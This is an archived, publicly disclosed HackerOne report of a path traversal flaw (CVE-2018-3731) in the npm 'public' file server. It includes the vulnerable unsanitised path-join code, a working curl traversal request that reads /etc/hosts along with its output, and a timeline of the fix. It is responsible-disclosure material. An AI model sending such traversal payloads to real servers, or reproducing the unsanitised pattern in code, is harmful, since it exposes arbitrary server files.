---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-02-17
submitted: 2018-02-06T16:12:58.503Z
bounty_usd: null
votes: 4
cve: "CVE-2018-3731"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "bl4de"
source: "https://hackerone.com/reports/312918"
title: "[public] Path Traversal allows to read content of arbitrary files"
---
# [public] Path Traversal allows to read content of arbitrary files

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** Node.js third-party modules | **Disclosed:** 2018-02-17

- Report: [https://hackerone.com/reports/312918](https://hackerone.com/reports/312918)
- CWE: Path Traversal | CVE: CVE-2018-3731
- Submitted: 2018-02-06T16:12:58.503Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi Guys,

There is Path Traversal in public module.
It allows to read content of arbitrary files on the remote server.

## Module

**public**

Run static file hosting server with specified public dir & port. Support a "direcotry index" like Apache httpd.

https://www.npmjs.com/package/public

version: 0.1.2

Stats
3 downloads in the last day
30 downloads in the last week
384 downloads in the last month

~4600 estimated downloads per year


## Description

Lack of file path sanitization causes that any file on the server might be read by malicious user.

Vulnerability exists, because path is used without any check against Path Traversal attacks:

```javascript
// node_modules/public/bin/public, line 73:
    var pathname = url.parse(req.url).pathname;
    var filePath = path.join(dir, pathname); // Real file path
    var base = filePath.replace(dir, ''); // Base path for browser link
    var abs = path.resolve(filePath); 
    console.log(new Date().toString(), abs);
    fs.readFile(filePath, function(err, data) {
      if (err) {
        (...)
      }
      res.writeHead(200, { 'Content-Type': mime.lookup(filePath) });
      res.end(data);
```
As you can notice, ```filePath``` is used directly, as read from url.

## Steps To Reproduce:


- install ```public```:

```
$ npm install public
```

- run ```public``` in direcotry of your choice:

```
me:~/playground/hackerone/Node$ ./node_modules/public/bin/public ./ 8080
Public.js server running with "/home/rafal.janicki/playground/hackerone/Node" on port 8080
```

- execute following ```curl``` command (adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../etc/hosts
```

- see result:

```
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../etc/hosts HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< last-modified: Tue, 23 Jan 2018 14:51:52 GMT
< content-length: 188
< content-type: application/octet-stream
< Date: Tue, 06 Feb 2018 15:40:51 GMT
< Connection: keep-alive
< 
127.0.0.1	localhost
127.0.1.1	LT0081U2

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
* Connection #0 to host 127.0.0.1 left intact
```

## Supporting Material/References:


- Ubuntu 16.04 LTS
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.4 LTS
- npm version: 5.6.0
- curl 7.47.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability allows to read content of arbitrary files from the server where module is run.

## Timeline

- **Report Filed**
- **Report Triaged**
- **2018-02-07** @lirantal: Hi @bl4de ,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Report Severity Updated**
- **Changed Scope**
- **Cve Id Added**
- **2018-02-14** @lirantal: Since the author didn't join the report I opened a security issue in the repo.
- **External User Joined**
- **2018-02-15** @tnantoka: Thanks for reporting. I'm a author.
I fixed the issue with [this commit](https://github.com/tnantoka/public/commit/eae8ad8017b260f8667ded5e12801bd72b877af2).
- **2018-02-15** @bl4de: Hi @tnantoka, 

Thanks for the fix, it looks like issue is not reproducible anymore.

However, during testing your fix, I've found yet another issue and will open new report for it.
- **Report Resolved**
- **Agreed On Going Public**
- **2018-02-15** @bl4de: @lirantal I am always fine with public disclosures :)
- **2018-02-15** @lirantal: Cool :-)

@tnantoka can we go ahead with it?
- **2018-02-16** @tnantoka: @lirantal No problem!
- **2018-02-17** @lirantal: Great, I disclosed it.
- **Manually Disclosed**
